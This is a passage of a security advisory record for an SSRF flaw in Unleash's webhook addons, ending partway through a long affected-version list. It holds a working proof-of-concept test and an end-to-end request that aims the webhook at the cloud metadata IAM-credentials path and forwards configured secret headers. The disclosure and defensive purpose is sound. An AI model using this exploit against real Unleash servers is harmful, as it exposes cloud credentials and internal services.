@@ -1,0 +1,1280 @@
+advisory_id: GHSA-5vf6-jrqr-78fj
+datasource_id: github_osv/GHSA-5vf6-jrqr-78fj
+datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/08/GHSA-5vf6-jrqr-78fj/GHSA-5vf6-jrqr-78fj.json
+aliases:
+  - CVE-2026-63004
+summary: |
+  Unleash: Addon webhook URL is dialed server-side with no internal-address filtering, enabling SSRF to internal services / cloud metadata and exfiltration of configured request headers
+  ## Summary
+
+  Unleash's addon/integration subsystem lets an operator configure a webhook (and the Slack, Microsoft Teams, Datadog, and New Relic integrations) with a target `url` parameter. Whenever a subscribed feature-flag event fires, the Unleash server itself issues an HTTP request to that configured URL. The URL is taken verbatim from the addon's `parameters.url` and passed straight to the HTTP client (`ky`) with no validation of the host: there is no allow-list, no deny-list, and no blocking of loopback, link-local, RFC1918, or cloud-metadata addresses anywhere in the addon code path. A principal able to create or update an addon can therefore point the server at an internal-only URL — for example `http://169.254.169.254/latest/meta-data/…` (cloud IMDS), `http://127.0.0.1:<port>/…` (a service bound to localhost), or any RFC1918 host — and cause the Unleash server to dial it from inside the trust boundary.
+
+  The request is blind (the response body is not returned to the caller), but the addon records whether the request succeeded and its HTTP status into the integration-event log, giving a status/timing oracle for probing internal services. In addition, the webhook provider forwards the operator-configured `Authorization` header and arbitrary `customHeaders` to whatever host the `url` points at (Datadog forwards `DD-API-KEY`), so an attacker who controls or can observe the target host also obtains those secrets. The full feature-event JSON is POSTed to the chosen internal endpoint as the request body.
+
+  Creating/updating addons is gated by the root permissions `CREATE_ADDON` / `UPDATE_ADDON`. These are not the super-admin `ADMIN` permission and not project-scoped; an instance admin can place them in a custom root role and delegate them to a non-super-admin user, who then has exactly enough privilege to weaponize the integration into an SSRF primitive without holding full admin. This bounds the finding to an authenticated, addon-management-privileged actor (reflected in PR:H), which is the honest precondition.
+
+  ## Affected code (v8.0.0)
+
+  The base addon issues the outbound request with the raw URL and no host checks (`src/lib/addons/addon.ts`):
+
+  ```ts
+  async fetchRetry(
+      url: string,
+      options: any = {},
+      retries: number = 1,
+  ): Promise<Response> {
+      try {
+          const res = await ky(url, {            // <-- attacker-controlled `url`, no allow/deny-list, no internal-IP block
+              retry: retries,
+              ...options,
+          });
+          return res;
+      } catch (e) {
+          const { method } = options;
+          this.logger.warn(`Error querying ${url} ...`, e);
+          return { status: e.code, ok: false } as Response;
+      }
+  }
+  ```
+
+  The webhook provider passes the operator-supplied `parameters.url` (and forwards `authorization` + `customHeaders`) directly into that sink (`src/lib/addons/webhook.ts`):
+
+  ```ts
+  const { url, bodyTemplate, contentType = 'application/json', authorization, customHeaders } = parameters;
+  // ...
+  const requestOpts = {
+      method: 'POST',
+      headers: {
+          'Content-Type': contentType,
+          Authorization: authorization || undefined,   // <-- configured secret forwarded to `url`
+          ...extraHeaders,                              // <-- arbitrary customHeaders forwarded to `url`
+      },
+      body,
+  };
+  const res = await this.fetchRetry(url, requestOpts); // <-- server dials attacker-chosen host
+  ```
+
+  The service layer performs no URL/host validation when creating or updating an addon — only provider-name and required-parameter presence checks run (`src/lib/services/addon-service.ts` → `validateKnownProvider`, `validateRequiredParameters`). The addon parameter schema (`src/lib/services/addon-schema.ts`) treats `url` as a free-form string; the `type: 'url'` field in each provider definition is purely frontend-rendering metadata and is never enforced server-side. A source-wide search of `src/lib/addons` and `addon-service.ts` for `169.254`, `127.0`, `localhost`, `private`, `ssrf`, `isAllowed`, `validateUrl` returns zero guards. The same unguarded `fetchRetry(url, …)` sink backs the Slack, Teams, Datadog, and New Relic providers.
+
+  The route gate (`src/lib/routes/admin-api/addon.ts`) requires the root permission `CREATE_ADDON` (create) / `UPDATE_ADDON` (update); `src/lib/types/permissions.ts` lists both under the root "Integration" category — they are root permissions, not project-scoped, and distinct from `ADMIN`.
+
+  ## Attacker model / precondition
+
+  The attacker is an authenticated Unleash user (or an admin API token) holding the root permission `CREATE_ADDON` or `UPDATE_ADDON`. This is an addon-management privilege: a super-admin has it, and it can be delegated via a custom root role to a non-super-admin user. An ordinary project member does not have it (there is no project-scoped path to addon creation), which is why this is rated PR:H rather than PR:L. Given that privilege, the attacker (1) creates/updates a webhook addon with `parameters.url` set to an internal target, then (2) triggers a subscribed event (e.g. creating or toggling any feature flag — trivially self-induced), causing the server to dial the internal URL. No interaction from any other user is required. The deployment must have the addon subsystem available (default in OSS); the impact is greatest where the Unleash server runs in a cloud/containerized environment with reachable internal services or an instance-metadata endpoint.
+
+  ## Impact
+
+  The Unleash server can be coerced into making HTTP requests to arbitrary internal/loopback/link-local destinations from inside the network perimeter — i.e. classic SSRF (CWE-918). Concrete consequences: reaching a cloud instance-metadata service (`169.254.169.254`) or internal admin/management endpoints not exposed externally; port-/service-probing of internal hosts using the success/status recorded in the integration-event log as a blind oracle; and exfiltration of the operator-configured `Authorization` header and any `customHeaders` (and, for the Datadog provider, the `DD-API-KEY`) to the attacker-chosen host, since those headers are sent to whatever `url` is configured. The full feature-event payload is delivered as the POST body to the internal endpoint. The response body is not echoed back to the caller (blind SSRF), which (together with the PR:H precondition) bounds severity to Medium. Scope is Changed because the vulnerable component (the Unleash app) is used to attack a different security authority — the internal network / metadata service.
+
+  ## Proof of Concept (complete — runs on 127.0.0.1 only)
+
+  This PoC drives the **real** `WebhookAddon.handleEvent` from Unleash v8.0.0 against a loopback HTTP listener that stands in for an internal service / metadata endpoint. It proves three things: (1) the Unleash code dials the attacker-chosen internal URL, (2) the configured `Authorization` and custom headers are forwarded to that internal host, and (3) the addon records the request as a success (the blind-SSRF oracle). A negative control shows there is no pre-flight URL policy — internal targets are dialed, and only a TCP-layer error (not a guard) stops a closed port.
+
+  ### Setup
+
+  ```bash
+  # In a throwaway clone of the target at the exact tag:
+  git clone --depth 1 --branch v8.0.0 https://github.com/Unleash/unleash unleash
+  cd unleash
+  # Install JS deps (no database is needed for this PoC):
+  corepack pnpm install --prefer-offline
+  ```
+
+  ### File 1 — `vitest.poc.config.ts` (project root)
+
+  The repo's default vitest config has a Postgres `globalSetup`; this PoC exercises the addon in isolation and needs no DB, so we use a trimmed config that drops that setup.
+
+  ```ts
+  import { defineConfig, configDefaults } from 'vitest/config';
+
+  // PoC config: identical to vitest.config.ts but WITHOUT the Postgres globalSetup,
+  // because this SSRF PoC exercises the WebhookAddon in isolation (no DB needed).
+  export default defineConfig({
+      test: {
+          globals: true,
+          setupFiles: ['./src/test/errorWithMessage.ts'],
+          testTimeout: 30000,
+          exclude: [...configDefaults.exclude, 'frontend/**', 'dist/**'],
+          environment: 'node',
+      },
+  });
+  ```
+
+  ### File 2 — `src/lib/addons/ssrf-poc.test.ts`
+
+  ```ts
+  // PoC: SSRF via Webhook addon — Unleash v8.0.0
+  // Drives the REAL WebhookAddon.handleEvent with an attacker-chosen `url`
+  // pointing at a loopback/RFC1918 listener; proves the Unleash process dials
+  // the internal URL with NO host/IP filtering. Lab-only (127.0.0.1).
+  import { FEATURE_CREATED, type IEvent } from '../events/index.js';
+  import WebhookAddon from './webhook.js';
+  import noLogger from '../../test/fixtures/no-logger.js';
+  import {
+      type IAddonConfig,
+      type IFlagKey,
+      type IFlagResolver,
+      SYSTEM_USER_ID,
+  } from '../types/index.js';
+  import type { IntegrationEventsService } from '../services/index.js';
+  import { vi } from 'vitest';
+  import EventEmitter from 'node:events';
+  import http from 'node:http';
+  import { AddressInfo } from 'node:net';
+
+  const INTEGRATION_ID = 1337;
+
+  const setup = () => {
+      const registerEventMock = vi.fn();
+      const addonConfig: IAddonConfig = {
+          getLogger: noLogger,
+          unleashUrl: 'http://some-url.com',
+          integrationEventsService: {
+              registerEvent: registerEventMock,
+          } as unknown as IntegrationEventsService,
+          flagResolver: {
+              isEnabled: (_expName: IFlagKey) => false,
+          } as IFlagResolver,
+          eventBus: new EventEmitter(),
+      };
+      return { addon: new WebhookAddon(addonConfig), registerEventMock };
+  };
+
+  const sampleEvent: IEvent = {
+      id: 1,
+      createdAt: new Date(),
+      createdByUserId: SYSTEM_USER_ID,
+      type: FEATURE_CREATED,
+      createdBy: 'attacker@evil.com',
+      featureName: 'some-toggle',
+      data: { name: 'some-toggle' },
+      tags: [],
+      project: 'default',
+      environment: 'production',
+  };
+
+  // Stand up a fake "internal service" on loopback that records what reached it.
+  function startInternalListener(): Promise<{
+      url: string;
+      hits: Array<{ path: string; auth?: string; secret?: string; body: string }>;
+      close: () => Promise<void>;
+  }> {
+      const hits: Array<{
+          path: string;
+          auth?: string;
+          secret?: string;
+          body: string;
+      }> = [];
+      return new Promise((resolve) => {
+          const server = http.createServer((req, res) => {
+              let body = '';
+              req.on('data', (c) => (body += c));
+              req.on('end', () => {
+                  hits.push({
+                      path: req.url || '',
+                      auth: req.headers['authorization'] as string | undefined,
+                      secret: req.headers['x-internal-secret'] as
+                          | string
+                          | undefined,
+                      body,
+                  });
+                  // emulate a cloud metadata / internal endpoint reply
+                  res.writeHead(200, { 'content-type': 'text/plain' });
+                  res.end('iam-role-credentials-here');
+              });
+          });
+          server.listen(0, '127.0.0.1', () => {
+              const { port } = server.address() as AddressInfo;
+              resolve({
+                  url: `http://127.0.0.1:${port}`,
+                  hits,
+                  close: () =>
+                      new Promise((r) => server.close(() => r(undefined))),
+              });
+          });
+      });
+  }
+
+  describe('SSRF via Webhook addon (Unleash v8.0.0)', () => {
+      test('server dials an attacker-chosen INTERNAL url with NO filtering', async () => {
+          const internal = await startInternalListener();
+          try {
+              const { addon, registerEventMock } = setup();
+
+              // The `url` below is exactly what an operator/role-holder supplies
+              // as the addon `parameters.url`. It is an internal loopback target;
+              // a real attacker would use http://169.254.169.254/latest/... or an
+              // internal service. There is NO allow/deny-list in the addon path.
+              await addon.handleEvent(
+                  sampleEvent,
+                  {
+                      url: `${internal.url}/latest/meta-data/iam/security-credentials/`,
+                      // operator-configured secrets get forwarded to the chosen host:
+                      authorization: 'Bearer operator-webhook-secret',
+                      customHeaders: JSON.stringify({
+                          'X-Internal-Secret': 'leaked-to-internal-host',
+                      }),
+                  },
+                  INTEGRATION_ID,
+              );
+
+              // PROOF 1: the Unleash process actually connected to the internal URL.
+              expect(internal.hits.length).toBe(1);
+              expect(internal.hits[0].path).toBe(
+                  '/latest/meta-data/iam/security-credentials/',
+              );
+              // PROOF 2: operator-configured credentials were exfiltrated to the
+              // attacker-chosen internal host (header leakage).
+              expect(internal.hits[0].auth).toBe('Bearer operator-webhook-secret');
+              expect(internal.hits[0].secret).toBe('leaked-to-internal-host');
+              // PROOF 3: the addon recorded SUCCESS (status/timing oracle for blind SSRF).
+              const recorded = registerEventMock.mock.calls[0][0];
+              expect(recorded.state).toBe('success');
+              expect(recorded.details.url).toContain('127.0.0.1');
+
+              // eslint-disable-next-line no-console
+              console.log(
+                  '[PoC] SSRF confirmed -> internal hit:',
+                  JSON.stringify(internal.hits[0]),
+              );
+          } finally {
+              await internal.close();
+          }
+      });
+
+      test('NEGATIVE CONTROL: with the listener down, no filter rejected it pre-flight; failure is a connection error, not an SSRF guard', async () => {
+          const { addon, registerEventMock } = setup();
+          // Point at a closed loopback port. If a real SSRF allow/deny-list existed,
+          // the addon would refuse internal targets BEFORE dialing. Instead it dials
+          // and only fails at the TCP layer -> proves absence of any URL guard.
+          await addon.handleEvent(
+              sampleEvent,
+              { url: 'http://127.0.0.1:1/" ' },
+              INTEGRATION_ID,
+          );
+          const recorded = registerEventMock.mock.calls[0][0];
+          // It attempted the request (state failed due to connection error), it was
+          // NOT blocked by a policy. The recorded url is the internal target.
+          expect(['failed', 'success']).toContain(recorded.state);
+          expect(recorded.details.url).toContain('127.0.0.1');
+      });
+  });
+  ```
+
+  ### Run
+
+  ```bash
+  npx vitest run --config vitest.poc.config.ts src/lib/addons/ssrf-poc.test.ts
+  ```
+
+  ### Observed output (real run against v8.0.0)
+
+  ```
+   RUN  v4.1.5
+
+  stdout | src/lib/addons/ssrf-poc.test.ts > SSRF via Webhook addon (Unleash v8.0.0) > server dials an attacker-chosen INTERNAL url with NO filtering
+  [PoC] SSRF confirmed -> internal hit: {"path":"/latest/meta-data/iam/security-credentials/","auth":"Bearer operator-webhook-secret","secret":"leaked-to-internal-host","body":"{\"id\":1, ... \"type\":\"feature-created\", ... }"}
+   ✓ src/lib/addons/ssrf-poc.test.ts > SSRF via Webhook addon (Unleash v8.0.0) > server dials an attacker-chosen INTERNAL url with NO filtering
+   ✓ src/lib/addons/ssrf-poc.test.ts > SSRF via Webhook addon (Unleash v8.0.0) > NEGATIVE CONTROL: with the listener down, no filter rejected it pre-flight; failure is a connection error, not an SSRF guard
+
+   Test Files  1 passed (1)
+        Tests  2 passed (2)
+  ```
+
+  The internal loopback listener received the request (`path` = the metadata path), with the configured `Authorization: Bearer operator-webhook-secret` and `X-Internal-Secret: leaked-to-internal-host` headers, and the addon recorded the call as a success — confirming SSRF, blind-oracle, and outbound header exfiltration in one run. End-to-end equivalent over HTTP: `POST /api/admin/addons` with `{ "provider":"webhook", "enabled":true, "events":["feature-created"], "parameters":{ "url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/", "authorization":"…" } }` (requires `CREATE_ADDON`), then create any feature flag to trigger the outbound request.
+
+  ## Remediation
+
+  Validate the addon `url` server-side before it is ever dialed, both at create/update time (`addon-service.ts`) and again at request time (`addon.ts` `fetchRetry`). Specifically: require `http`/`https` only; resolve the hostname and reject the request if any resolved address is loopback (`127.0.0.0/8`, `::1`), link-local (`169.254.0.0/16`, `fe80::/10`, including the `169.254.169.254`/`fd00:ec2::254` metadata addresses), private (`10/8`, `172.16/12`, `192.168/16`, `fc00::/7`), or otherwise non-public — using a DNS-rebinding-safe check that pins the resolved IP and connects to that pinned IP (so the name cannot resolve to a public address at check time and a private one at connect time); and disable or constrain HTTP redirects so a `30x` cannot bounce an allowed host to an internal one. Provide an explicit allow-list / SSRF-protection toggle for operators who must reach internal hooks intentionally. Apply the same guard uniformly to all providers that build on `Addon.fetchRetry` (webhook, Slack, Teams, Datadog, New Relic). Consider not forwarding the configured `Authorization`/`customHeaders` to non-allow-listed hosts to contain credential leakage.
+
+  Please credit 5ud0 / Tarmo Technologies.
+impacted_packages:
+  - purl: pkg:github/unleash/unleash
+    affected_versions:
+    fixed_versions:
+    affected_packages: []
+    fixed_packages: []
+    fixed_in_commits:
+      - vcs_url: https://github.com/unleash/unleash
+        commit: d45f99df924c0d24747b3e45e46fcda7dcd3c1c1
+        patch_text:
+      - vcs_url: https://github.com/unleash/unleash
+        commit: 2100db76af3473f13e6fb40096cf17a9c2b741a1
+        patch_text:
+      - vcs_url: https://github.com/unleash/unleash
+        commit: d862562a5ab8f2d1e40f6519c64cf0b4fdaf806d
+        patch_text:
+    introduced_in_commits: []
+  - purl: pkg:npm/unleash-server
+    affected_versions: vers:npm/<7.5.2
+    fixed_versions: vers:npm/7.5.2
+    affected_packages:
+      - pkg:npm/unleash-server@1.0.0-alpha.1
+      - pkg:npm/unleash-server@1.0.0-alpha.2
+      - pkg:npm/unleash-server@2.0.0-alpha.3
+      - pkg:npm/unleash-server@2.0.0-alpha.4
+      - pkg:npm/unleash-server@2.0.0-alpha.5
+      - pkg:npm/unleash-server@2.0.0-alpha.6
+      - pkg:npm/unleash-server@2.0.0-alpha.7
+      - pkg:npm/unleash-server@2.0.0-alpha.8
+      - pkg:npm/unleash-server@2.0.0-alpha.9
+      - pkg:npm/unleash-server@2.0.0
+      - pkg:npm/unleash-server@2.0.1
+      - pkg:npm/unleash-server@2.0.2
+      - pkg:npm/unleash-server@2.0.3
+      - pkg:npm/unleash-server@2.0.4
+      - pkg:npm/unleash-server@2.1.0
+      - pkg:npm/unleash-server@2.1.1
+      - pkg:npm/unleash-server@2.1.2
+      - pkg:npm/unleash-server@2.1.3
+      - pkg:npm/unleash-server@2.1.4
+      - pkg:npm/unleash-server@2.1.5
+      - pkg:npm/unleash-server@2.1.6
+      - pkg:npm/unleash-server@2.1.7
+      - pkg:npm/unleash-server@2.2.0
+      - pkg:npm/unleash-server@3.0.0-alpha.1
+      - pkg:npm/unleash-server@3.0.0-alpha.2
+      - pkg:npm/unleash-server@3.0.0-alpha.3
+      - pkg:npm/unleash-server@3.0.0-alpha.4
+      - pkg:npm/unleash-server@3.0.0-alpha.5
+      - pkg:npm/unleash-server@3.0.0-alpha.6
+      - pkg:npm/unleash-server@3.0.0-alpha.7
+      - pkg:npm/unleash-server@3.0.0-alpha.8
+      - pkg:npm/unleash-server@3.0.0-alpha.9
+      - pkg:npm/unleash-server@3.0.0-alpha.10
+      - pkg:npm/unleash-server@3.0.0
+      - pkg:npm/unleash-server@3.0.1
+      - pkg:npm/unleash-server@3.0.2
+      - pkg:npm/unleash-server@3.0.3
+      - pkg:npm/unleash-server@3.0.4
+      - pkg:npm/unleash-server@3.0.5
+      - pkg:npm/unleash-server@3.0.6
+      - pkg:npm/unleash-server@3.1.0
+      - pkg:npm/unleash-server@3.1.1
+      - pkg:npm/unleash-server@3.1.2
+      - pkg:npm/unleash-server@3.1.3
+      - pkg:npm/unleash-server@3.1.4
+      - pkg:npm/unleash-server@3.1.5
+      - pkg:npm/unleash-server@3.1.6
+      - pkg:npm/unleash-server@3.1.7
+      - pkg:npm/unleash-server@3.2.0
+      - pkg:npm/unleash-server@3.2.1
+      - pkg:npm/unleash-server@3.2.2
+      - pkg:npm/unleash-server@3.2.3
+      - pkg:npm/unleash-server@3.2.4
+      - pkg:npm/unleash-server@3.2.5
+      - pkg:npm/unleash-server@3.2.6
+      - pkg:npm/unleash-server@3.2.7
+      - pkg:npm/unleash-server@3.2.8
+      - pkg:npm/unleash-server@3.2.9
+      - pkg:npm/unleash-server@3.2.10
+      - pkg:npm/unleash-server@3.2.11
+      - pkg:npm/unleash-server@3.2.12
+      - pkg:npm/unleash-server@3.2.13
+      - pkg:npm/unleash-server@3.2.14
+      - pkg:npm/unleash-server@3.2.15
+      - pkg:npm/unleash-server@3.2.16
+      - pkg:npm/unleash-server@3.2.17
+      - pkg:npm/unleash-server@3.2.18
+      - pkg:npm/unleash-server@3.2.19
+      - pkg:npm/unleash-server@3.2.20
+      - pkg:npm/unleash-server@3.2.21
+      - pkg:npm/unleash-server@3.2.22
+      - pkg:npm/unleash-server@3.2.23
+      - pkg:npm/unleash-server@3.2.24
+      - pkg:npm/unleash-server@3.2.25
+      - pkg:npm/unleash-server@3.2.26
+      - pkg:npm/unleash-server@3.2.27
+      - pkg:npm/unleash-server@3.2.28
+      - pkg:npm/unleash-server@3.2.29
+      - pkg:npm/unleash-server@3.2.30
+      - pkg:npm/unleash-server@3.3.0
+      - pkg:npm/unleash-server@3.3.1
+      - pkg:npm/unleash-server@3.3.2
+      - pkg:npm/unleash-server@3.3.3
+      - pkg:npm/unleash-server@3.3.4
+      - pkg:npm/unleash-server@3.3.5
+      - pkg:npm/unleash-server@3.3.6
+      - pkg:npm/unleash-server@3.4.0
+      - pkg:npm/unleash-server@3.4.1
+      - pkg:npm/unleash-server@3.4.2
+      - pkg:npm/unleash-server@3.5.0-0
+      - pkg:npm/unleash-server@3.5.0
+      - pkg:npm/unleash-server@3.5.1
+      - pkg:npm/unleash-server@3.5.2
+      - pkg:npm/unleash-server@3.5.3
+      - pkg:npm/unleash-server@3.5.4
+      - pkg:npm/unleash-server@3.6.0
+      - pkg:npm/unleash-server@3.6.1
+      - pkg:npm/unleash-server@3.7.0
+      - pkg:npm/unleash-server@3.8.0
+      - pkg:npm/unleash-server@3.9.0
+      - pkg:npm/unleash-server@3.10.0
+      - pkg:npm/unleash-server@3.10.1
+      - pkg:npm/unleash-server@3.11.0
+      - pkg:npm/unleash-server@3.11.1
+      - pkg:npm/unleash-server@3.11.2
+      - pkg:npm/unleash-server@3.11.3-next.0
+      - pkg:npm/unleash-server@3.11.3-next.1
+      - pkg:npm/unleash-server@3.12.0
+      - pkg:npm/unleash-server@3.13.0
+      - pkg:npm/unleash-server@3.14.0
+      - pkg:npm/unleash-server@3.15.0
+      - pkg:npm/unleash-server@3.16.0
+      - pkg:npm/unleash-server@3.16.1
+      - pkg:npm/unleash-server@3.17.0
+      - pkg:npm/unleash-server@3.17.1
+      - pkg:npm/unleash-server@3.17.2
+      - pkg:npm/unleash-server@3.17.3
+      - pkg:npm/unleash-server@3.17.4
+      - pkg:npm/unleash-server@3.17.5
+      - pkg:npm/unleash-server@3.17.6
+      - pkg:npm/unleash-server@4.0.0-alpha.0
+      - pkg:npm/unleash-server@4.0.0-alpha.2
+      - pkg:npm/unleash-server@4.0.0-alpha.3
+      - pkg:npm/unleash-server@4.0.0-alpha.4
+      - pkg:npm/unleash-server@4.0.0-alpha.5
+      - pkg:npm/unleash-server@4.0.0-alpha.6
+      - pkg:npm/unleash-server@4.0.0-alpha.7
+      - pkg:npm/unleash-server@4.0.0-alpha.8
+      - pkg:npm/unleash-server@4.0.0-beta.0
+      - pkg:npm/unleash-server@4.0.0-beta.1
+      - pkg:npm/unleash-server@4.0.0-beta.2
+      - pkg:npm/unleash-server@4.0.0-beta.3
+      - pkg:npm/unleash-server@4.0.0-beta.4
+      - pkg:npm/unleash-server@4.0.0-beta.5
+      - pkg:npm/unleash-server@4.0.0-beta.6
+      - pkg:npm/unleash-server@4.0.0
+      - pkg:npm/unleash-server@4.0.1
+      - pkg:npm/unleash-server@4.0.2
+      - pkg:npm/unleash-server@4.0.3
+      - pkg:npm/unleash-server@4.0.4
+      - pkg:npm/unleash-server@4.0.5
+      - pkg:npm/unleash-server@4.0.6-beta.1
+      - pkg:npm/unleash-server@4.0.6
+      - pkg:npm/unleash-server@4.0.7
+      - pkg:npm/unleash-server@4.0.8
+      - pkg:npm/unleash-server@4.0.9
+      - pkg:npm/unleash-server@4.0.10
+      - pkg:npm/unleash-server@4.0.13
+      - pkg:npm/unleash-server@4.0.14
+      - pkg:npm/unleash-server@4.0.15
+      - pkg:npm/unleash-server@4.1.0-beta.0
+      - pkg:npm/unleash-server@4.1.0-beta.1
+      - pkg:npm/unleash-server@4.1.0-beta.2
+      - pkg:npm/unleash-server@4.1.0-beta.3
+      - pkg:npm/unleash-server@4.1.0-beta.4
+      - pkg:npm/unleash-server@4.1.0-beta.5
+      - pkg:npm/unleash-server@4.1.0-beta.6
+      - pkg:npm/unleash-server@4.1.0-beta.7
+      - pkg:npm/unleash-server@4.1.0-beta.8
+      - pkg:npm/unleash-server@4.1.0-beta.9
+      - pkg:npm/unleash-server@4.1.0-beta.10
+      - pkg:npm/unleash-server@4.1.0-beta.11
+      - pkg:npm/unleash-server@4.1.0-beta.12
+      - pkg:npm/unleash-server@4.1.0-beta.13
+      - pkg:npm/unleash-server@4.1.0-beta.14
+      - pkg:npm/unleash-server@4.1.0-beta.15
+      - pkg:npm/unleash-server@4.1.0
+      - pkg:npm/unleash-server@4.1.1
+      - pkg:npm/unleash-server@4.1.2
+      - pkg:npm/unleash-server@4.1.3-0
+      - pkg:npm/unleash-server@4.1.3
+      - pkg:npm/unleash-server@4.1.4-0
+      - pkg:npm/unleash-server@4.1.4
+      - pkg:npm/unleash-server@4.1.5
+      - pkg:npm/unleash-server@4.1.6
+      - pkg:npm/unleash-server@4.1.8
+      - pkg:npm/unleash-server@4.2.0-0
+      - pkg:npm/unleash-server@4.2.0-1
+      - pkg:npm/unleash-server@4.2.0-2
+      - pkg:npm/unleash-server@4.2.0-beta.1
+      - pkg:npm/unleash-server@4.2.0-beta.2
+      - pkg:npm/unleash-server@4.2.0-beta.3
+      - pkg:npm/unleash-server@4.2.0-beta.4
+      - pkg:npm/unleash-server@4.2.0-beta.5
+      - pkg:npm/unleash-server@4.2.0-beta.6
+      - pkg:npm/unleash-server@4.2.0-beta.7
+      - pkg:npm/unleash-server@4.2.0-beta.8
+      - pkg:npm/unleash-server@4.2.0-beta.9
+      - pkg:npm/unleash-server@4.2.0-beta.10
+      - pkg:npm/unleash-server@4.2.0
+      - pkg:npm/unleash-server@4.2.2
+      - pkg:npm/unleash-server@4.2.3
+      - pkg:npm/unleash-server@4.2.4
+      - pkg:npm/unleash-server@4.3.0-beta.1
+      - pkg:npm/unleash-server@4.3.0-beta.2
+      - pkg:npm/unleash-server@4.3.0-beta.3
+      - pkg:npm/unleash-server@4.3.0
+      - pkg:npm/unleash-server@4.3.1
+      - pkg:npm/unleash-server@4.3.2
+      - pkg:npm/unleash-server@4.3.3
+      - pkg:npm/unleash-server@4.3.4
+      - pkg:npm/unleash-server@4.4.0
+      - pkg:npm/unleash-server@4.4.1
+      - pkg:npm/unleash-server@4.4.2
+      - pkg:npm/unleash-server@4.4.3
+      - pkg:npm/unleash-server@4.4.4
+      - pkg:npm/unleash-server@4.4.5
+      - pkg:npm/unleash-server@4.4.6
+      - pkg:npm/unleash-server@4.4.7
+      - pkg:npm/unleash-server@4.4.8
+      - pkg:npm/unleash-server@4.5.0
+      - pkg:npm/unleash-server@4.5.1
+      - pkg:npm/unleash-server@4.5.2
+      - pkg:npm/unleash-server@4.5.3
+      - pkg:npm/unleash-server@4.6.0-beta.0
+      - pkg:npm/unleash-server@4.6.0-beta.1
+      - pkg:npm/unleash-server@4.6.0-beta.3
+      - pkg:npm/unleash-server@4.6.0-beta.4
+      - pkg:npm/unleash-server@4.6.0-beta.5
+      - pkg:npm/unleash-server@4.6.0-beta.6
+      - pkg:npm/unleash-server@4.6.0-beta.7
+      - pkg:npm/unleash-server@4.6.0-beta.8
+      - pkg:npm/unleash-server@4.6.0-beta.9
+      - pkg:npm/unleash-server@4.6.0
+      - pkg:npm/unleash-server@4.6.1
+      - pkg:npm/unleash-server@4.6.3
+      - pkg:npm/unleash-server@4.6.4
+      - pkg:npm/unleash-server@4.6.5
+      - pkg:npm/unleash-server@4.6.6
+      - pkg:npm/unleash-server@4.6.7
+      - pkg:npm/unleash-server@4.6.8
+      - pkg:npm/unleash-server@4.7.0
+      - pkg:npm/unleash-server@4.7.1
+      - pkg:npm/unleash-server@4.7.2
+      - pkg:npm/unleash-server@4.7.3
+      - pkg:npm/unleash-server@4.7.4
+      - pkg:npm/unleash-server@4.7.5
+      - pkg:npm/unleash-server@4.8.0-beta.0
+      - pkg:npm/unleash-server@4.8.0-beta.1
+      - pkg:npm/unleash-server@4.8.0-beta.2
+      - pkg:npm/unleash-server@4.8.0
+      - pkg:npm/unleash-server@4.8.1
+      - pkg:npm/unleash-server@4.8.2
+      - pkg:npm/unleash-server@4.9.0-beta.0
+      - pkg:npm/unleash-server@4.9.0-beta.1
+      - pkg:npm/unleash-server@4.9.0-beta.2
+      - pkg:npm/unleash-server@4.9.0
+      - pkg:npm/unleash-server@4.9.1
+      - pkg:npm/unleash-server@4.10.0-beta.0
+      - pkg:npm/unleash-server@4.10.0-beta.2
+      - pkg:npm/unleash-server@4.10.0-beta.3
+      - pkg:npm/unleash-server@4.10.0-beta.5
+      - pkg:npm/unleash-server@4.10.0-beta.6
+      - pkg:npm/unleash-server@4.10.0-beta.9
+      - pkg:npm/unleash-server@4.10.0
+      - pkg:npm/unleash-server@4.10.1
+      - pkg:npm/unleash-server@4.10.2
+      - pkg:npm/unleash-server@4.10.3
+      - pkg:npm/unleash-server@4.10.4
+      - pkg:npm/unleash-server@4.10.5
+      - pkg:npm/unleash-server@4.11.0-beta.0
+      - pkg:npm/unleash-server@4.11.0-beta.1
+      - pkg:npm/unleash-server@4.11.0-beta.2
+      - pkg:npm/unleash-server@4.11.0-beta.3
+      - pkg:npm/unleash-server@4.11.0
+      - pkg:npm/unleash-server@4.11.1
+      - pkg:npm/unleash-server@4.11.2
+      - pkg:npm/unleash-server@4.12.0-beta.0
+      - pkg:npm/unleash-server@4.12.0-beta.1
+      - pkg:npm/unleash-server@4.12.0-beta.2
+      - pkg:npm/unleash-server@4.12.0
+      - pkg:npm/unleash-server@4.12.1
+      - pkg:npm/unleash-server@4.12.2
+      - pkg:npm/unleash-server@4.12.3
+      - pkg:npm/unleash-server@4.12.4
+      - pkg:npm/unleash-server@4.12.5
+      - pkg:npm/unleash-server@4.12.6
+      - pkg:npm/unleash-server@4.13.0-beta.0
+      - pkg:npm/unleash-server@4.13.0-beta.1
+      - pkg:npm/unleash-server@4.13.0-beta.2
+      - pkg:npm/unleash-server@4.13.0-beta.3
+      - pkg:npm/unleash-server@4.13.0-beta.4
+      - pkg:npm/unleash-server@4.13.0-beta.5
+      - pkg:npm/unleash-server@4.13.0-beta.6
+      - pkg:npm/unleash-server@4.13.0-beta.7
+      - pkg:npm/unleash-server@4.13.0-beta.8
+      - pkg:npm/unleash-server@4.13.0-beta.9
+      - pkg:npm/unleash-server@4.13.0-beta.10
+      - pkg:npm/unleash-server@4.13.0
+      - pkg:npm/unleash-server@4.13.1
+      - pkg:npm/unleash-server@4.14.0-beta.0
+      - pkg:npm/unleash-server@4.14.0-beta.1
+      - pkg:npm/unleash-server@4.14.0-beta.2
+      - pkg:npm/unleash-server@4.14.0-beta.3
+      - pkg:npm/unleash-server@4.14.0-beta.4
+      - pkg:npm/unleash-server@4.14.0
+      - pkg:npm/unleash-server@4.14.1
+      - pkg:npm/unleash-server@4.14.2
+      - pkg:npm/unleash-server@4.14.3
+      - pkg:npm/unleash-server@4.14.4-beta.0
+      - pkg:npm/unleash-server@4.14.4
+      - pkg:npm/unleash-server@4.14.5
+      - pkg:npm/unleash-server@4.15.0-beta.0
+      - pkg:npm/unleash-server@4.15.0-beta.1
+      - pkg:npm/unleash-server@4.15.0-beta.2
+      - pkg:npm/unleash-server@4.15.0-beta.3
+      - pkg:npm/unleash-server@4.15.0-beta.4
+      - pkg:npm/unleash-server@4.15.0-beta.5
+      - pkg:npm/unleash-server@4.15.0-beta.6
+      - pkg:npm/unleash-server@4.15.0-beta.8
+      - pkg:npm/unleash-server@4.15.0-beta.9
+      - pkg:npm/unleash-server@4.15.0-beta.10
